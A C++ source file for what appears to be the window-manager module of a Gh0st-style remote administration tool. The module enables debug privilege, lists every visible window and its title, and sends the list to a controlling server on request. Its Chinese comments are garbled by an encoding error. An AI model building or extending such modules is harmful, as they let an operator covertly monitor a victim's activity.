#include "WindowManager.h"



CWindowManager::CWindowManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	printf("Զ�̴��ڹ����캯��\r\n");
	SetProcessPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	SendClientWindowList();
}


CWindowManager::~CWindowManager()
{
	printf("���ڹ�����������\r\n");
	SetProcessPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}
void  CWindowManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_WINDOW_REFRESH_REQUIRE:
	{
		SendClientWindowList();
		break;
	}
	

	}
}
BOOL  CWindowManager::SendClientWindowList()
{
	//��ϵͳע��һ��ö�ٴ��ڵĺ���
	LPBYTE  BufferData = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData);
	if (BufferData != NULL)
	{
		BufferData[0] = CLIENT_WINDOW_MANAGER_REPLY;
	}
	//�����ݰ����͵������
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
	LocalFree(BufferData);
	return TRUE;
}
BOOL  CALLBACK  CWindowManager::EnumWindowProcedure(HWND Hwnd, LPARAM lParam)
{
	DWORD  BufferLength = 0;
	DWORD  Offset = 0;
	DWORD  ProcessID = 0;
	LPBYTE  BufferData = *(LPBYTE *)lParam;

	char  WindowTitleName[0x400] = { 0 };
	memset(WindowTitleName, 0, sizeof(WindowTitleName));
	//�õ�ϵͳ�������Ĵ��ھ���Ĵ��ڱ���
	GetWindowText(Hwnd, WindowTitleName, sizeof(WindowTitleName));
	//�����жϴ����Ƿ�ɼ������Ϊ��
	if (!IsWindowVisible(Hwnd) || lstrlen(WindowTitleName) == 0)
	{
		return TRUE;
	}
	if (BufferData == NULL)
	{
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);      //��ʱ���仺����
	}
	//[Flag][HWND][WindowTitleName]
	BufferLength = sizeof(HWND) + lstrlen(WindowTitleName) + 1;
	Offset = LocalSize(BufferData);
	BufferData = (LPBYTE)LocalReAlloc(BufferData, Offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	memcpy((BufferData + Offset), &Hwnd, sizeof(HWND));
	memcpy(BufferData + Offset + sizeof(HWND), WindowTitleName, lstrlen(WindowTitleName) + 1);

	*(LPBYTE*)lParam = BufferData;
	return TRUE;
}